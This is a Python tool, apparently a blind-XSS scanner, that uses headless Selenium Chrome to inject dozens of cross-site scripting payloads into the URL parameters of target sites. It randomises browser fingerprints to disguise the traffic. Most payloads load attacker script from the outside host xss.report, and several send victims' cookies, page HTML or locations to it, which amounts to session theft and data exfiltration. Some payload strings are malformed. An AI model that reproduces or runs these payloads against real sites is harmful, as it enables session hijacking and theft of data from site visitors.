import os
import re
import time
import sys
import subprocess
import urllib.parse
from urllib.parse import urlparse, parse_qs
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from concurrent.futures import ThreadPoolExecutor
import readline
import random
import base64

def set_random_user_agent_and_preferences(options):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0"
    ]
    random_user_agent = random.choice(user_agents)
    options.add_argument(f"user-agent={random_user_agent}")

    timezones = [
        "America/New_York",
        "Europe/London",
        "Asia/Kolkata",
        "Australia/Sydney",
        "Africa/Johannesburg"
    ]
    random_timezone = random.choice(timezones)
    options.add_experimental_option("prefs", {"intl.accept_languages": "en-US,en;q=0.9"})
    options.add_argument(f"--lang=en-US")
    options.add_argument(f"--timezone={random_timezone}")

    screen_sizes = [
        "1920,1080",
        "1366,768",
        "1536,864",
        "1280,720",
        "1440,900"
    ]
    random_screen_size = random.choice(screen_sizes)
    width, height = random_screen_size.split(",")
    options.add_argument(f"--window-size={width},{height}")

    referrers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.yahoo.com/",
        "https://www.facebook.com/",
        "https://twitter.com/"
    ]
    random_referrer = random.choice(referrers)
    options.add_argument(f"--referer={random_referrer}")

    languages = [
        "en-US",
        "es-ES",
        "fr-FR",
        "de-DE",
        "it-IT",
        "pt-BR",
        "ja-JP", 
        "zh-CN",
        "ru-RU"
    ]
    random_language = random.choice(languages)
    options.add_argument(f"--lang={random_language}")

def complete_file_path(text, state):
    files = [f for f in os.listdir('.') if f.startswith(text)]
    if state < len(files):
        return files[state]
    else:
        return None

def extract_query_parameter_name(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    if query_params:
        return list(query_params.keys())[0]
    else:
        return None

def display_welcome_message():
    os.system('clear')
    print("\033[0;32m  ______              _     _  ______ ______  ")
    print("\033[0;32m (____  \            (_)   (_)/ _____) _____) ")
    print("\033[0;32m  ____)  )_____ _____   ___  ( (____( (____   ")
    print("\033[0;32m |  __  (| ___ | ___ | |   |  \____ \\____ \  ")
    print("\033[0;32m | |__)  ) ____| ____|/ / \ \ _____) )____) ) ")
    print("\033[0;32m |______/|_____)_____)_|   |_(______(______/  ")
                                            

    print("\033[0m")

    created_by_text = "Program created by: AnonKryptiQuz"
    ascii_width = 45
    padding = (ascii_width - len(created_by_text)) // 2
    print(" " * padding + f"\033[0;31m{created_by_text}\033[0m")
    print("")

def is_valid_url(url):
    url_pattern = r"^(http|https)://[a-zA-Z0-9.-]+(\.[a-zA-Z]{2,})?(/.*)?$"
    return re.match(url_pattern, url) is not None

def get_base_url_or_file():
    while True:
        readline.set_completer(complete_file_path)
        readline.parse_and_bind('tab: complete')

        user_input = input("\033[0;37m[?] Enter the base URL or the path to the file with URLs: \033[0m")

        if not user_input:
            print("\033[0;31m[!] You must provide a valid URL or file.\033[0m")
            print("\033[1;33m[i] Press Enter to try again...\033[0m")
            input()
            os.system('clear')
            display_welcome_message()
        elif os.path.isfile(user_input):
            with open(user_input, 'r') as file:
                urls_in_file = file.read()
                if "http" not in urls_in_file:
                    print("\033[0;31m[!] File does not contain valid URLs.\033[0m")
                    print("\033[1;33m[i] Press Enter to try again...\033[0m")
                    input()
                    os.system('clear')
                    display_welcome_message()
                else:
                    username = get_username()
                    return user_input, True, username
        elif is_valid_url(user_input):
            username = get_username()
            return user_input, False, username
        else:
            print("\033[0;31m[!] Invalid URL or file path.\033[0m")
            print("\033[1;33m[i] Press Enter to try again...\033[0m")
            input()
            os.system('clear')
            display_welcome_message()

def get_username():
    while True:
        username = input("\033[0;37m[?] Enter your username: \033[0m").strip()
        if not username:
            print("\033[0;31m[!] Username cannot be blank.\033[0m")
            print("\033[1;33m[i] Press Enter to try again...\033[0m")
            input()
            os.system('clear')
            display_welcome_message()
        else:
            return username

def encode_script_with_username(username):
    script = f'var a=document.createElement("script");a.src="https://xss.report/c/{username}";document.body.appendChild(a);'
    encoded_script = base64.b64encode(script.encode('utf-8')).decode('utf-8')
    return encoded_script

encode_times = 0

def check_xss_vulnerability(base_url, username, driver, encode_times, vulnerable_urls):
    parsed_url = urlparse(base_url)
    query_params = parse_qs(parsed_url.query)

    for param_name, param_values in query_params.items():
        for param_value in param_values:
            encoded_script = encode_script_with_username(username)

            payloads = [
                r'"><script src=https://xss.report/c/{username}></script>',
                r"javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/{username}\';document.body.appendChild(a)')",
                f'"><img src=x id={encoded_script} onerror=eval(atob(this.id))>',
                r'"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/{username}&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
                r'<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/{username}");a.send();</script>',
                f'"><input onfocus=eval(atob(this.id)) id={encoded_script} autofocus>',
                f'"><video><source onerror=eval(atob(this.id)) id={encoded_script}>',
                r'<script>$.getScript("//xss.report/c/{username}")</script>',
                r'var a=document.createElement("script");a.src="https://xss.report/c/{username}";document.body.appendChild(a);',
                r'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\{username}/.source))//>'
                r'"><Img Src=//xss.report/c/{username}/x Onload=import(src+0)>',
                r'‘;"/></textarea></script><script src=//xss.report/c/{username}>',
                r'zer0_sec 1"><script src="https://xss.report/c/{username}"></script>@anonymous@gmail.com',
                r'anonymous@gmail.com"><script src="https://xss.report/c/{username}"></script>',
                r'anonymous@gmail.com<!--" --><script src=https://xss.report/c/{username}></script>',
                r'anonymous@gmail.com"><svg onload="fetch(\'https://xss.report/c/{username}?cookie=\'+document.cookie)"></svg>',
                r'<img src="https://xss.report/c/{username}" onerror="this.src=\'https://xss.report/c/{username}\'">',
                r'<img src="x" onerror="this.src=\'https://xss.report/c/{username}\'">',
                r'<img src="x" onerror="fetch(\'https://xss.report/c/{username}\', {method: \'POST\', body: btoa(document.body.innerHTML), mode: \'no-cors\'})">',
                r'<iframe src="javascript:window.location=\'https://xss.report/c/{username}\'"></iframe>',
                r'<iframe srcdoc="<script>window.location=\'https://xss.report/c/{username}\'</script>"></iframe>',
                r'<iframe srcdoc="<script>fetch(\'https://xss.report/c/{username}\', {method: \'POST\', body: btoa(parent.document.body.innerHTML), mode: \'no-cors\'})</script>"></iframe>',
                r'<object data="javascript:window.location=\'https://xss.report/c/{username}\'"></object>',
                r'<input onfocus="fetch(\'https://xss.report/c/{username}\', {method: \'POST\', mode: \'no-cors\'})" autofocus>',
                r'<script type="text/javascript" src="https://xss.report/c/{username}"></script>',
                r'<script type="module" src="https://xss.report/c/{username}"></script>',
                r'<script nomodule src="https://xss.report/c/{username}"></script>',
                r'javascript:window.location=\'https://xss.report/c/{username}\'',
                r'javascript:fetch(\'https://xss.report/c/{username}\')',
                r'--></tiTle></stYle></texTarea></scrIpt>"//><scrIpt src="https://xss.report/c/{username}"></scrIpt>',
                r'<svg/onload="window.location.href=\'https://xss.report/c/{username}\'">',
                r'<audio src onerror="fetch(\'https://xss.report/c/{username}\', {method: \'POST\', mode: \'no-cors\'})">',
                r'<script>new Image().src=\'https://xss.report/c/{username}\'</script>',
                r'<form action="https://xss.report/c/{username}" method="POST"><input name="data" value=""></form><script>document.forms[0].submit();</script>',
                r'<iframe src="javascript:fetch(\'https://xss.report/c/{username}\')"></iframe>',
                r'<link rel="stylesheet" href="https://xss.report/c/{username}" onerror="fetch(\'https://xss.report/c/{username}\')">',
                r'<meta http-equiv="refresh" content="0;url=https://xss.report/c/{username}">',
                r'<object data="https://xss.report/c/{username}" onerror="this.data=\'https://xss.report/c/{username}\'"></object>',
                r'<svg/onload="fetch(\'https://xss.report/c/{username}\')">',
                r'{constructor.constructor(\'fetch("https://xss.report/c/{username}")\')()}',
                r'<img src=x onerror="fetch(\'https://xss.report/c/{username}\')">',
                r'"></script></title></textarea><script src=//https://xss.report/c/{username}></script>',
                r'<svg/onload="var a=\'fetch\';var b=\'https://xss.report/c/{username}\'; setTimeout(a+\'(b)\',1000)">',
                r'<iframe src="javascript:setTimeout(\'fetch(\\\"https://xss.report/c/{username}\\\")\', 1000)"></iframe>',
                r'/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//><scrIpt src="https://xss.report/c/{username}"></scrIpt>',
                r'"><img src=x onerror="setTimeout(String.fromCharCode(102,101,116,99,104)+\'("https://xss.report//{username}")\', 0)">',
                r'"><script>\'/*\'/*`/*--><svg onload=fetch("https://xss.report/c/{username}")></script>',
                r'?><svg/onload="fetch(\'https://xss.report/c/{username}?cookie=\'+document.cookie)"//>',
                r'<img src=x onerror="setTimeout(function(){fetch(\'https://xss.report/c/{username}?data=\'+document.cookie)},10)"//>',
                r'<input autofocus onfocus="fetch(\'https://xss.report/c/{username}?token=\'+document.cookie)"//>',
                r'<iframe src="javascript:void(0)" onload="fetch(\'https://xss.report/c/{username}?url=\'+location.href)"//><!--" -->',
                r'"></title></textarea></script></style></noscript><script src=https://xss.report/c/{username}></script>',
                r'AnonKryptiQuz"<script src=https://xss.report/c/{username}></script>',
                r'--></tiTle></stYle></texTarea></scrIpt>"//\'//><scrIpt src=https://xss.report/c/{username}></scrIpt>',
                r'/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//\'//><scrIpt src="https://xss.report/c/{username}"></scrIpt>',
                r'-"><Svg Src=//xss.report/c/{username}/s OnLoad=import(this.getAttribute(\'src\')+0)>',
                r'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:https://xss.report/c/{username}\00?1=1290/.source))//>',
                r'\"><input autofocus nope="%26quot;x%26quot;" onfocus="frames.location=\'https://xss.report/c/{username}?c=\'+Reflect.get(document,\'coo\' + \'kie\')">',
                r'\"></script><img src="x" onerror="with(document)body.appendChild(createElement(\'script\')).src=\'https://xss.report/c/{username}\'">',
                r'<p><img src="https://xss.report/c/{username}" border="0" />--&gt;</p>',
                r'{globalThis.constructor("fetch(\'https://xss.report/c/{username}?cookie=\'+document.cookie)")()}',
                r'<iframe src="https://xss.report" onload="fetch(\'https://xss.report/c/{username}?cookie=\' + document.cookie)"></iframe>',
                r'</script><Iframe SrcDoc="><script src=https://xss.report/c/{username}></script>">',
                r'--></tiTle></stYle></texTarea></scrIpt>"//\'//><scrIpt src="https://xss.report/c/{username}"></scrIpt>',
                r'"><script src=https://xss.report/c/{username}></script><img src=x onerror=fetch(\'https://xss.report/c/{username}?c=\'+document.cookie)>',
                r'javascript:/*\'/*`/*\\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=fetch(\'https://xss.report/c/{username}?cookie=\'+document.cookie)//>',
                r'javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch(\'https://xss.report/c/{username}?cookie=\'+document.cookie)/*--><html */ onmouseover=alert()//>'
            ]

            base_url_no_value = base_url.split('?')[0]

            for index, payload in enumerate(payloads, start=1):
                payload_with_username = payload.replace("{username}", username)

                for encode_step in range(encode_times + 1):
                    encoded_payload = payload_with_username

                    for _ in range(encode_step):
                        encoded_payload = urllib.parse.quote(encoded_payload)

                    modified_query_params = query_params.copy()
                    modified_query_params[param_name] = [encoded_payload]

                    full_url = f"{base_url_no_value}?{'&'.join([f'{key}={urllib.parse.quote(value[0])}' for key, value in modified_query_params.items()])}"

                    print(f"\033[1;33m[+] URL Endpoint: \033[0m\033[0;37m{base_url}\033[0m")
                    print(f"\033[0;35m[i] Parameter: \033[0m\033[0;37m{param_name}\033[0m")
                    print(f"\033[0;35m[i] Payload: \033[0m\033[0;37m{payload_with_username}\033[0m")
                    print(f"\033[0;35m[i] Payload Encoded {encode_step}-{encode_times} times: \033[0m\033[0;37m{encoded_payload}\033[0m")
                    print(f"\033[0;36m[i] URL: \033[0m\033[0;37m{full_url}\033[0m")

                    driver.get(full_url)
                    time.sleep(3) # the timeout to load the page, reduce it to make the program faster
                    if "xss.report" in driver.page_source:
                        print(f"\033[1;32m[?] Might Be Vulnerable\033[0m\n")
                        vulnerable_urls.append(full_url)
                    else:
                        print(f"\033[1;31m[?] Might Not Be Vulnerable\033[0m\n")

def save_results_to_file(vulnerable_urls):
    save_input = input("[?] Do you want to save the results to a file? y/n (Press enter for default N): ").strip().lower()

    if save_input == 'y':
        output_file = f"scan_results_{time.strftime('%Y%m%d%H%M%S')}.txt"
        print(f"\033[1;33m[i] Saving results to {output_file}...\033[0m")
        with open(output_file, 'w') as file:
            for url in vulnerable_urls:
                file.write(f"{url}\n")
        print(f"\033[0;32m[i] Results saved to {output_file}\033[0m")
    else:
        print("\033[0;31m[i] Results not saved.\033[0m")

def handle_exit(signum, frame):
    print("\n\033[0;31m[!] Program interrupted. Exiting...\033[0m")
    sys.exit(1)

def scan_urls_from_file(file_path, username, driver, encode_times, vulnerable_urls):
    valid_urls = []
    with open(file_path, 'r') as file:
        for line in file:
            base_url = line.strip()
            if not base_url:
                continue
            if is_valid_url(base_url):
                param_name = extract_query_parameter_name(base_url)
                if param_name:
                    check_xss_vulnerability(base_url, username, driver, encode_times, vulnerable_urls)
                    valid_urls.append(base_url)
                else:
                    print(f"\033[0;31m[!] No valid query parameter found in the URL: {base_url}\033[0m")
            else:
                print(f"\033[0;31m[!] Invalid URL skipped: {base_url}\033[0m")
    return valid_urls

def main():
    display_welcome_message()
    input_source, is_file, username = get_base_url_or_file()

    print(f"\033[1;34m[i] Username entered: {username}\033[0m")

    while True:
        try:
            encode_times_input = input("\033[0;37m[?] How many times do you want to encode the payloads? (Default is 0, between 0-3): \033[0m")
            if encode_times_input == "":
                encode_times = 0
                break
            encode_times = int(encode_times_input)
            if 0 <= encode_times <= 3:
                break
            else:
                print("\033[0;31m[!] Please enter a number between 0 and 3.\033[0m")
                print("\033[1;33m[i] Press Enter to try again...\033[0m")
                input()
                os.system('clear')
                display_welcome_message()
        except ValueError:
            print("\033[0;31m[!] Invalid input. Please enter a number.\033[0m")
            print("\033[1;33m[i] Press Enter to try again...\033[0m")
            input()
            os.system('clear')
            display_welcome_message()

    print(f"\033[1;34m[i] Encode times: {encode_times}\033[0m")

    print("\n\033[1;33m[i] Loading, Please Wait...\033[0m")
    time.sleep(3)
    os.system('clear')

    print("\033[1;34m[i] Starting BXSS vulnerability check\033[0m")
    print("\033[1;36m[i] Starting Web Driver, Please wait...\033[0m\n")

    start_time = time.time()
    total_scanned = 0
    vulnerable_urls = []

    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument("--disable-gpu")
    options.add_argument('--disable-extensions')
    options.add_argument('--disable-infobars')
    options.add_argument('--disable-default-apps')

    set_random_user_agent_and_preferences(options)

    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    
    if is_file:
        valid_urls = scan_urls_from_file(input_source, username, driver, encode_times, vulnerable_urls)
        total_scanned = len(valid_urls)
    else:
        param_name = extract_query_parameter_name(input_source)
        if not param_name:
            print("\033[0;31m[!] No valid query parameter found in the URL.\033[0m")
            sys.exit(1)
        check_xss_vulnerability(input_source, username, driver, encode_times, vulnerable_urls)
        total_scanned = 1

    driver.quit()

    elapsed_time = time.time() - start_time

    print(f"\033[1;33m[i] Scan finished!\033[0m")
    print(f"\033[1;33m[i] Total URLs Scanned: {total_scanned}\033[0m")
    print(f"\033[1;33m[i] Time Taken: {int(elapsed_time)} seconds.\033[0m\n")

    save_results_to_file(vulnerable_urls)

if __name__ == "__main__":
    import signal
    signal.signal(signal.SIGINT, handle_exit)
    main()
